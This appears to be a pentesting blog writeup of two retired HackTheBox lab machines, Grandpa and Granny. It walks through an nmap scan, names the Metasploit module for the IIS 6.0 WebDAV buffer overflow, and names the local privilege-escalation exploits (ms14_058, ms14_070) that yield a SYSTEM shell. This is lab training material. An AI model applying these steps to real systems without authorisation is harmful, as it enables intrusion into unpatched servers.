---
layout: post
title: "Writeup: HackTheBox Grandpa and Granny - with Metasploit"
description: "Rooting both Grandpa and Granny using Metasploit."
tags: pentest hackthebox writeup
---

This series will follow my exercises in [HackTheBox][]. All published writeups are for retired HTB machines. Whether
 or not I use Metasploit to pwn the server will be indicated in the title.
 
# Grandpa

_<small>Difficulty: Easy</small>_

_<small>Machine IP: 10.10.10.14</small>_

# Granny

_<small>Difficulty: Easy</small>_

_<small>Machine IP: 10.10.10.15</small>_

Grandpa and Granny are so similar that you can exploit them both using the same commands. For this reason, I've listed them together in this write up. The commands will interchangeably reference `10.10.10.14` or `10.10.10.15`, since these services are essentially the same.

Starting our port scan:

```bash
sudo nmap -sS -T4 --top-ports 1000 10.10.10.15

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-12 00:01 EDT
Nmap scan report for 10.10.10.15
Host is up (0.050s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http
```

Every other TCP port (using `-p-`) is filtered, as well as the top 20 UDP ports, so I'm assuming all we have is this web server on port 80.

Interrogating the server with `-sC -sV`, we get:

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Date: Tue, 05 May 2020 03:17:37 GMT
|_  Server Type: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

So this is an IIS server version 6.0. I pull up [this exploit][iis exploit] on Exploit-DB. It targets IIS 6.0 servers by exploiting a buffer overflow in the `ScStoragePathFromUrl` function in the WebDav service. And it has a Metasploit module: `windows/iis/iis_webdav_scstoragepathfromurl`.

Executing this module gives us a Meterpreter shell as `NT AUTHORITY\NETWORK SERVICE`. We still need to escalate to a non-service user and/or SYSTEM.

We can determine the users on the box with:

```bat
net users

User accounts for \\GRANNY

-------------------------------------------------------------------------------
Administrator            ASPNET                   Guest                    
IUSR_GRANPA              IWAM_GRANPA              Lakis                    
SUPPORT_388945a0         
The command completed successfully.
```

And on Grandpa:

```bat
User accounts for \\GRANPA

-------------------------------------------------------------------------------
Administrator            ASPNET                   Guest                    
Harry                    IUSR_GRANPA              IWAM_GRANPA              
SUPPORT_388945a0         
The command completed successfully.
```

So the Grandpa user is `Harry` and the Granny user is `Lakis`.

Let's use `post/multi/recon/local_exploit_suggester` to identify privilege escalation vectors.

```bash
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 30 exploit checks are being tried...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

On Grandpa, I got a system shell with `windows/local/ms14_058_track_popup_menu`. On Granny, I opted to use `windows/local/ms14_070_tcpip_ioctl`. Which you choose doesn't really matter - both systems are vulnerable and both exploits give you a root shell.

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

From here we can collect the user and root flags on both machines.

[hackthebox]: https://www.hackthebox.eu

[iis exploit]: https://www.exploit-db.com/exploits/41992
